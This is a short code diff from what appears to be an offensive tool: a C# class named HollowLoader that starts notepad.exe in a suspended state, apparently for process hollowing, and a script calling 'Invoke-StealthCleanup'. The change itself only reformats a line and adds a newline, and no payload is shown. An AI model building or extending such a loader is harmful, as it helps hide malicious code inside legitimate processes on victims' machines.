@@ -151,8 +151,7 @@ public class HollowLoader {
             si.cb = (uint)Marshal.SizeOf(si);
             var pi = new PROCESS_INFORMATION();
 
-            bool success = CreateProcess(@"C:\Windows\System32\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false,
-                0x4, IntPtr.Zero, null, ref si, out pi);
+           bool success = CreateProcess(@"C:\Windows\System32\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
 
             if (!success) {
                 Console.WriteLine("[-] CreateProcess failed: " + Marshal.GetLastWin32Error());
@@ -307,3 +306,4 @@ Invoke-StealthCleanup
 
 Write-Host "`n[!] Script Finished." -ForegroundColor Cyan
 Read-Host "Press ENTER to close..."
+
